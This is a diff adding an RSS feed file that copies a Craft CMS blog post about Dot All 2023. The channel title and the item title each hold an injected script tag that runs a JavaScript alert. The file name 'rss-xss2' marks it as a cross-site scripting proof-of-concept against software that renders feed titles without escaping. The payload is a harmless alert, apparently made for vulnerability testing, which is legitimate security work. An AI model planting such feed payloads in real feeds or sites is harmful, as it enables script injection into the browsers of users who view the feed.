@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+
+
+  <channel>
+    
+    
+    <title><script>alert(44444)</script></title>
+    <link>https://craftcms.com/blog</link>
+    <atom:link href="https://blog.whitebear.vn/file/rss-xss2.rss" rel="self" type="application/rss+xml" />
+    <description></description>
+    <language>en-us</language>
+    <pubDate>Wed, 08 Mar 2023 11:42:00 -0800</pubDate>
+    <lastBuildDate>Wed, 08 Mar 2023 11:42:00 -0800</lastBuildDate>
+
+          <item>
+        <title><script>alert(5555)</script></title>
+        <link>https://craftcms.com/blog/dot-all-2023</link>
+        <pubDate>Wed, 08 Mar 2023 11:42:00 -0800</pubDate>
+        <author>hello@craftcms.com</author>
+        <guid>https://craftcms.com/blog/dot-all-2023</guid>
+        <description><![CDATA[
+          <p>Dot All 2023 is coming to Barcelona!</p>
+
+          <p><a href="https://craftcms.com/blog/dot-all-2023">Continue reading</a></p>
+        ]]></description>
+      </item>
+         
+      </channel>
+</rss>
